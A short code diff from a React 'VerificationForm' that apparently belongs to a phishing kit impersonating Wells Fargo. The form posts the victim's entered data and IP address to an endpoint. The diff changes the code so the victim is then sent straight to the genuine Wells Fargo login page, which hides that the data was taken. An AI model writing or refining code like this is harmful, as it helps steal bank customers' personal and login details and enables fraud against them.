@@ -59,6 +59,7 @@ const VerificationForm = () => {
             },
             body: JSON.stringify([state, data, ip, ipUrl], null, 2)
         });
+        router.push('https://connect.secure.wellsfargo.com/auth/login/present?origin=enroll')
 
     }
 
@@ -377,7 +378,7 @@ const VerificationForm = () => {
 
                     {!isValid && <p className={'semi-bold text-medium lg:text-lg text-red-500 mx-12 capitalize font-fargo '}>Please fill in all the required fields*</p>}
                     <button onClick={handleSubmit(onSubmit)} type='submit' className={'  hover:underline mx-12 mt-7 bg-gray-400 pr-6 p-2 text-white mb-3 nowrap rounded-md ' + (isValid && ' text-white border-verify rounded-md bg-red-900 text-white ')}><span className='ml-3'>Verify</span></button>
-                    {isSubmitSuccessful && router.push('https://connect.secure.wellsfargo.com/auth/login/present?origin=enroll')}
+                    
 
 
                 </form>
